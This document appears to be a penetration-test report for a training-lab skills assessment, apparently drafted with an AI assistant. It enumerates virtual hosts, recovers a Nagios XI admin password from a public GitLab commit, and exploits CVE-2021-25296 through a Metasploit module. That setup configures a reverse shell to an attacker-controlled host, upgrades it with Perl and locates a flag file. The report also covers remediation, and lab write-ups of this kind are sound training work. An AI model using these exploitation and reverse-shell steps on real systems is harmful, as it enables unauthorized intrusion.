## Full Penetration Testing Report

> **Assessment type:** External penetration test / Skills Assessment  
> **Target:** `10.129.157.194`  
> **Known vhost:** `gitlab.inlanefreight.local`  
> **Primary objective:** Enumerate the target, identify the WordPress/GitLab/Nagios services, obtain authenticated access, achieve remote code execution, obtain a reverse shell, and retrieve `flag.txt`.

---

# 1. Executive Summary

During the assessment, the target initially appeared to offer limited attack surface. Further enumeration revealed multiple virtual hosts behind the same web server:

- `gitlab.inlanefreight.local`
    
- `blog.inlanefreight.local`
    
- `monitoring.inlanefreight.local`
    

The GitLab instance exposed a public project named **Virtualhost**. Examination of GitLab content and related public projects revealed credentials for the Nagios XI administrative account.

The third virtual host, `monitoring.inlanefreight.local`, was identified as **Nagios XI 5.7.5**.

Using the discovered credentials, authenticated access to Nagios XI was obtained. Nagios XI 5.7.5 is affected by authenticated OS command-injection vulnerabilities in its configuration wizards, including CVE-2021-25296. NVD describes CVE-2021-25296 as an OS command injection vulnerability in the Windows WMI configuration wizard, while Rapid7 documents a Metasploit module capable of authenticated RCE against Nagios XI 5.5.6–5.7.5. ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-25296?utm_source=chatgpt.com "NVD - CVE-2021-25296"))

The vulnerability was successfully exploited, resulting in a command shell as:

```text
www-data
```

A more interactive shell was obtained using Perl:

```bash
perl -e 'exec "/bin/bash", "-i";'
```

The flag was subsequently located at:

```text
/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
```

---

# 2. Assessment Questions and Answers

|#|Question|Answer|
|---|---|---|
|1|URL of WordPress instance|`http://blog.inlanefreight.local`|
|2|Name of public GitLab project|**Virtualhost**|
|3|FQDN of third vhost|`monitoring.inlanefreight.local`|
|4|Application running on third vhost|**Nagios**|
|5|Admin password|`oilaKglm7M09@CPL&^lC`|
|6|Reverse shell + flag|Flag located at `/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt`|

**Note:** The actual flag value was not captured in the conversation because the final `cat` output was not provided. The path above is the confirmed flag location.

---

# 3. Initial Enumeration

The original target IP during the earlier enumeration phase was:

```text
10.129.201.90
```

After the target was reset, the active target became:

```text
10.129.157.194
```

The known hostname was:

```text
gitlab.inlanefreight.local
```

This hostname was important because the HTTP service redirected traffic toward the GitLab instance.

## 3.1 Initial Nmap Enumeration

The initial scan identified the following relevant services:

```text
22/tcp    SSH
25/tcp    SMTP
80/tcp    HTTP
389/tcp   LDAP
443/tcp   HTTPS
8180/tcp  HTTP / GitLab
```

Notable observations:

### Port 22

```text
OpenSSH 8.2p1 Ubuntu
```

### Port 25

```text
Postfix SMTP
```

### Port 80

Apache was running and redirected toward:

```text
http://gitlab.inlanefreight.local:8180/
```

### Port 389

LDAP was exposed.

### Port 443

HTTPS was running Apache.

### Port 8180

The service was identified as GitLab.

---

# 4. Virtual Host Enumeration

Because the target was using name-based virtual hosting, enumeration of additional hostnames was required.

The following Gobuster command was used:

```bash
gobuster vhost -u http://10.129.201.90 \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
--append-domain \
--domain inlanefreight.local \
-t 30
```

The enumeration returned:

```text
gitlab.inlanefreight.local
blog.inlanefreight.local
monitoring.inlanefreight.local
```

These hosts represented three separate applications on the same target.

---

# 5. GitLab Enumeration

The first known virtual host was:

```text
gitlab.inlanefreight.local
```

The GitLab instance was accessible through port `8180`.

The public GitLab interface allowed exploration of publicly accessible projects.

The relevant project was:

```text
/root/virtualhost
```

The GitLab project title was:

```text
Administrator / Virtualhost
```

Therefore:

### Question 2

**Public GitLab project:**

```text
Virtualhost
```

---

# 6. WordPress Enumeration

The second discovered virtual host was:

```text
blog.inlanefreight.local
```

The host responded with a WordPress installation.

Evidence included WordPress-specific directories such as:

```text
/wp-includes/
/wp-content/
```

The site title identified it as:

```text
Inlanefreight Employee Blog
```

The WordPress version identified during enumeration was:

```text
WordPress 5.8
```

Therefore:

### Question 1

**WordPress URL:**

```text
http://blog.inlanefreight.local
```

---

# 7. Third Virtual Host

The third discovered vhost was:

```text
monitoring.inlanefreight.local
```

Requests using the appropriate `Host` header redirected to the Nagios XI login interface.

The application was identified from the page title and interface:

```text
Login · Nagios XI
```

The page also contained:

```text
Produced by Nagios XI
Powered by the Nagios Synthesis Framework
```

The version visible in the interface was:

```text
Nagios XI 5.7.5
```

Therefore:

### Question 3

```text
monitoring.inlanefreight.local
```

### Question 4

```text
Nagios
```

---

# 8. Nagios XI Enumeration

The Nagios installation was located under:

```text
/nagiosxi/
```

Directory enumeration was performed against the application.

Interesting paths discovered included:

```text
/about/
/account/
/admin/
/api/
/backend/
/config/
/db/
/help/
/images/
/includes/
/install.php
/login.php
/mobile/
/reports/
/sounds/
/tools/
/upgrade.php
/views/
```

Some interesting responses included:

```text
/db/       → 403
/includes/ → 403
/admin/    → session timeout
/config/   → session timeout
/backend/  → XML authentication failure
```

This established that the installation had a substantial administrative interface and several protected components.

---

# 9. Credential Discovery

The `Virtualhost` GitLab repository itself did not directly provide the final Nagios password.

Further examination of the publicly accessible GitLab content revealed another project:

```text
Administrator / Nagios Postgresql
```

A commit titled:

```text
Update INSTALL with master password
```

contained the Nagios administrative password.

The discovered password was:

```text
oilaKglm7M09@CPL&^lC
```

This provided the credentials required to authenticate to Nagios XI.

---

# 10. Nagios Authentication

The Nagios login credentials were:

```text
Username:
nagiosadmin

Password:
oilaKglm7M09@CPL&^lC
```

Authentication succeeded.

The Nagios XI dashboard confirmed the application version:

```text
Nagios XI 5.7.5
```

---

# 11. Vulnerability Identification

Nagios XI 5.7.5 is affected by multiple authenticated OS command-injection vulnerabilities in its configuration wizards.

The most relevant vulnerability for this assessment was:

```text
CVE-2021-25296
```

NVD identifies the vulnerable component as:

```text
/usr/local/nagiosxi/html/includes/configwizards/windowswmi/windowswmi.inc.php
```

and describes the vulnerability as improper sanitization of authenticated user-controlled input leading to OS command injection. ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-25296?utm_source=chatgpt.com "NVD - CVE-2021-25296"))

Rapid7 documents the corresponding Metasploit module:

```text
exploit/linux/http/nagios_xi_configwizards_authenticated_rce
```

The module targets Nagios XI versions:

```text
5.5.6 – 5.7.5
```

and requires valid Nagios credentials. ([Rapid7](https://www.rapid7.com/db/vulnerabilities/exploit/linux/http/nagios_xi_configwizards_authenticated_rce/?utm_source=chatgpt.com "Rapid7 Vulnerability Database"))

The vulnerability has a CVSS 3.1 score of:

```text
8.8 HIGH
```

according to NVD. ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-25296?utm_source=chatgpt.com "NVD - CVE-2021-25296"))

---

# 12. Metasploit Exploitation

Metasploit was started and the Nagios-related modules were searched:

```text
search nagios_xi
```

The relevant module was:

```text
exploit/linux/http/nagios_xi_configwizards_authenticated_rce
```

The module was selected:

```text
use exploit/linux/http/nagios_xi_configwizards_authenticated_rce
```

The module's options included:

```text
RHOSTS
RPORT
TARGETURI
TARGET_CVE
USERNAME
PASSWORD
VHOST
LHOST
LPORT
```

The target was configured as:

```text
set RHOSTS 10.129.157.194
```

The virtual host was configured:

```text
set VHOST monitoring.inlanefreight.local
```

Credentials:

```text
set USERNAME nagiosadmin
set PASSWORD oilaKglm7M09@CPL&^lC
```

The reverse-shell listener was configured:

```text
set LHOST 10.10.17.228
set LPORT 4444
```

The selected payload was:

```text
cmd/unix/reverse_perl_ssl
```

---

# 13. Successful Exploitation

The exploit was executed with:

```text
run
```

Metasploit reported:

```text
[*] Started reverse SSL handler on 10.10.17.228:4444
[*] Running automatic check
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI.
[+] The target appears to be vulnerable.
[*] Sending the payload...
[*] Command shell session opened
```

The target was therefore successfully compromised.

The exploit provided command execution as:

```text
www-data
```

The session's initial identity was:

```text
uid=33(www-data)
gid=33(www-data)
groups=33(www-data),125(Debian-snmp),1001(nagios),1002(nagcmd)
```

This was particularly interesting because the compromised account was also a member of:

```text
nagios
nagcmd
```

---

# 14. Obtaining an Interactive Shell

The initial Metasploit shell was a command shell rather than a normal interactive terminal.

An attempt was initially made to upgrade it using Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

However, Python was unavailable.

Metasploit also checked for common shell-upgrade utilities:

```text
python
python3
script
socat
```

They were unavailable.

Perl was then checked:

```bash
which perl
```

The target returned:

```text
/usr/bin/perl
```

A Bash shell was spawned through Perl:

```bash
perl -e 'exec "/bin/bash", "-i";'
```

This successfully provided a more usable interactive shell.

---

# 15. Initial Flag Search

The first exact search attempted was:

```bash
find / -name flag.txt 2>/dev/null
```

No result was returned.

A broader search was then performed:

```bash
find / -iname '*flag*' 2>/dev/null
```

This generated many false positives because GitLab and other applications contained filenames with the word `flag`.

Examples included GitLab feature-flag files and WordPress image assets.

Therefore, a more focused search was performed:

```bash
find / -name '*flag*.txt' 2>/dev/null
```

This successfully identified the assessment flag.

---

# 16. Flag Location

The flag was found at:

```text
/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
```

The command to retrieve it was:

```bash
cat /usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
```

The **flag value itself was not captured in the conversation**, so it should be inserted into the final report from the output of the `cat` command.

---

# 17. Additional Host Enumeration

During the investigation, the Nagios installation directories were inspected.

The following directory was particularly interesting:

```text
/usr/local/nagios/libexec
```

Its permissions showed that `www-data` owned the directory and could write to it:

```text
drwxrwsr-x 2 www-data nagios ...
```

Many plugins were also writable by `www-data`.

Two root-owned SUID binaries were also observed:

```text
check_dhcp
check_icmp
```

with permissions equivalent to:

```text
-rwsrwxr-x root nagios ...
```

and:

```text
-rwsrwxr-x root nagios ...
```

for `check_icmp`.

These findings represent additional potential privilege-escalation avenues, although **they were not required to complete this assessment**.

This is an important distinction: the assessment objective was satisfied after obtaining the reverse shell and locating the flag.

---

# 18. Commands Used — Complete Command Reference

## Vhost enumeration

```bash
gobuster vhost -u http://10.129.201.90 \
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
--append-domain \
--domain inlanefreight.local \
-t 30
```

## Metasploit module search

```text
search nagios_xi
```

## Load exploit

```text
use exploit/linux/http/nagios_xi_configwizards_authenticated_rce
```

## Configure target

```text
set RHOSTS 10.129.157.194
set VHOST monitoring.inlanefreight.local
set USERNAME nagiosadmin
set PASSWORD oilaKglm7M09@CPL&^lC
set LHOST 10.10.17.228
set LPORT 4444
```

## Exploit

```text
run
```

## Identify current user

```bash
id
```

Result:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data),125(Debian-snmp),1001(nagios),1002(nagcmd)
```

## Check Perl

```bash
which perl
```

Result:

```text
/usr/bin/perl
```

## Spawn interactive Bash

```bash
perl -e 'exec "/bin/bash", "-i";'
```

## Initial flag search

```bash
find / -name flag.txt 2>/dev/null
```

## Broad flag search

```bash
find / -iname '*flag*' 2>/dev/null
```

## Final flag search

```bash
find / -name '*flag*.txt' 2>/dev/null
```

Result:

```text
/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
```

## Read flag

```bash
cat /usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
```

---

# 19. Attack Chain

The entire attack path can be summarized as:

```text
Target IP
   │
   ▼
Port / Service Enumeration
   │
   ▼
Virtual Host Enumeration
   │
   ├── gitlab.inlanefreight.local
   │       │
   │       ▼
   │   Public GitLab Project
   │       │
   │       ▼
   │   Credential Discovery
   │
   ├── blog.inlanefreight.local
   │       │
   │       ▼
   │   WordPress 5.8
   │
   └── monitoring.inlanefreight.local
           │
           ▼
       Nagios XI 5.7.5
           │
           ▼
       Authenticate as nagiosadmin
           │
           ▼
    Config Wizard RCE
    CVE-2021-25296
           │
           ▼
       www-data shell
           │
           ▼
       Perl → Bash
           │
           ▼
     Search for flag
           │
           ▼
/usr/local/nagiosxi/html/admin/
           │
           ▼
       flag.txt
```

---

# 20. Vulnerability Analysis

## CVE-2021-25296 — Nagios XI OS Command Injection

The vulnerable Windows WMI configuration wizard improperly handles authenticated user-controlled input.

The affected component is:

```text
/usr/local/nagiosxi/html/includes/configwizards/windowswmi/windowswmi.inc.php
```

NVD identifies the vulnerability as OS command injection and rates it **8.8 HIGH** under CVSS 3.1. ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-25296?utm_source=chatgpt.com "NVD - CVE-2021-25296"))

Rapid7's corresponding module combines exploitation of the Nagios XI configuration-wizard vulnerabilities and supports versions `5.5.6` through `5.7.5`. ([Rapid7](https://www.rapid7.com/db/vulnerabilities/exploit/linux/http/nagios_xi_configwizards_authenticated_rce/?utm_source=chatgpt.com "Rapid7 Vulnerability Database"))

The vulnerability requires authentication, which is why obtaining the `nagiosadmin` credentials from the exposed GitLab content was a critical step.

---

# 21. Security Impact

The compromise demonstrated several serious security weaknesses.

### 21.1 Sensitive credentials exposed through public GitLab content

A public GitLab project contained a password capable of authenticating to the Nagios administrative interface.

Impact:

- Credential disclosure
    
- Unauthorized administrative access
    
- Increased attack surface
    
- Potential lateral movement
    

### 21.2 Vulnerable Nagios XI version

The host was running:

```text
Nagios XI 5.7.5
```

This version is affected by multiple command-injection vulnerabilities in configuration wizards. ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-25296?utm_source=chatgpt.com "NVD - CVE-2021-25296"))

### 21.3 Authenticated remote code execution

Once valid credentials were obtained, the attacker could exploit the configuration wizard to execute operating-system commands.

Rapid7 confirms that successful exploitation results in remote code execution as the web-server account. ([Rapid7](https://www.rapid7.com/db/vulnerabilities/exploit/linux/http/nagios_xi_configwizards_authenticated_rce/?utm_source=chatgpt.com "Rapid7 Vulnerability Database"))

### 21.4 File-system access

The resulting shell provided access as:

```text
www-data
```

The attacker could enumerate application files and locate the assessment flag.

### 21.5 Additional potentially dangerous permissions

The Nagios plugin directory was writable by `www-data`, and root-owned SUID binaries existed within it.

Although not necessary for this assessment, such permissions warrant remediation.

---

# 22. Remediation Recommendations

## 22.1 Upgrade Nagios XI

The highest-priority recommendation is to upgrade Nagios XI from:

```text
5.7.5
```

to a supported and patched version.

The affected configuration-wizard vulnerabilities are specifically associated with versions through 5.7.5. ([Rapid7](https://www.rapid7.com/db/vulnerabilities/exploit/linux/http/nagios_xi_configwizards_authenticated_rce/?utm_source=chatgpt.com "Rapid7 Vulnerability Database"))

---

## 22.2 Remove credentials from public repositories

The discovered password should be considered compromised.

Immediately:

1. Change the Nagios administrator password.
    
2. Rotate any credentials reused elsewhere.
    
3. Search Git history for other exposed secrets.
    
4. Remove sensitive information from repository history where appropriate.
    
5. Implement secret scanning.
    

---

## 22.3 Protect GitLab projects

Public repositories should not contain:

```text
Passwords
API keys
Database credentials
SSH private keys
Configuration secrets
Production credentials
```

Repository visibility should be reviewed.

---

## 22.4 Apply least privilege

The web-server account:

```text
www-data
```

should not have unnecessary write permissions over Nagios executable/plugin directories.

In particular, review:

```text
/usr/local/nagios/libexec
/usr/local/nagios/etc
```

The observed writable permissions should be restricted.

---

## 22.5 Review SUID binaries

The following binaries were identified as SUID root:

```text
/usr/local/nagios/libexec/check_dhcp
/usr/local/nagios/libexec/check_icmp
```

Their necessity and permissions should be reviewed.

SUID should only be used where strictly required.

---

## 22.6 Restrict administrative interfaces

Nagios XI administrative functionality should not be exposed unnecessarily to untrusted networks.

Recommended controls include:

- VPN access
    
- Firewall restrictions
    
- Network segmentation
    
- IP allowlisting
    
- MFA where supported
    
- Strong administrative passwords
    

---

## 22.7 Monitor for exploitation

Security monitoring should alert on suspicious activity involving:

```text
Nagios XI configuration wizards
Unexpected command execution
Unexpected child processes from web services
Reverse-shell connections
Changes to Nagios plugins
Unexpected modifications under /usr/local/nagios/
```

---

# 23. Lessons Learned

This assessment demonstrates why **iterative enumeration** is important.

The initial target did not immediately reveal an obvious route to compromise.

The successful chain depended on connecting several individually small findings:

```text
Virtual-host enumeration
        ↓
GitLab discovery
        ↓
Public project enumeration
        ↓
Credential disclosure
        ↓
Nagios authentication
        ↓
Version identification
        ↓
Vulnerability research
        ↓
Authenticated RCE
        ↓
Reverse shell
        ↓
Flag discovery
```

The most important lesson is that the known:

```text
gitlab.inlanefreight.local
```

vhost was not merely an isolated service. It led to information that enabled compromise of another application on the same host.

---

# 24. Final Assessment Results

### Q1 — WordPress URL

```text
http://blog.inlanefreight.local
```

### Q2 — Public GitLab project

```text
Virtualhost
```

### Q3 — Third vhost

```text
monitoring.inlanefreight.local
```

### Q4 — Application

```text
Nagios
```

### Q5 — Nagios admin password

```text
oilaKglm7M09@CPL&^lC
```

### Q6 — Flag

Flag file:

```text
/usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
```

Retrieve with:

```bash
cat /usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
```

**Flag value:** `[INSERT OUTPUT OF cat COMMAND HERE]`

---

# 25. Evidence / Key Screenshots to Include

For a polished CPTS-style submission, I'd include screenshots in this order:

1. **Nmap scan** showing exposed services.
    
2. **Gobuster vhost enumeration** showing the three vhosts.
    
3. **GitLab public project** showing `Virtualhost`.
    
4. **WordPress site** at `blog.inlanefreight.local`.
    
5. **Nagios XI login page**.
    
6. **Nagios XI 5.7.5 dashboard**.
    
7. **GitLab commit containing the discovered password**.
    
8. **Metasploit module configuration**.
    
9. **Successful authenticated exploitation / session opened**.
    
10. **`id` output showing `www-data`**.
    
11. **Perl shell upgrade**.
    
12. **Final `find` command showing the flag path**.
    
13. **`cat` output containing the flag**.
    

---

## One important correction to our earlier workflow

We explored the SUID binaries after obtaining the shell, but **that was unnecessary for this Skills Assessment**. The intended/required objective was already satisfied by the authenticated Nagios RCE → shell → flag path. The SUID findings are useful reconnaissance and should remain in the report as **additional observations**, not as part of the primary exploitation chain.

Also, Rapid7 confirms that the Nagios XI ConfigWizard RCE module targets versions `5.5.6–5.7.5`, matching the `5.7.5` instance encountered here. ([Rapid7](https://www.rapid7.com/db/vulnerabilities/exploit/linux/http/nagios_xi_configwizards_authenticated_rce/?utm_source=chatgpt.com "Rapid7 Vulnerability Database"))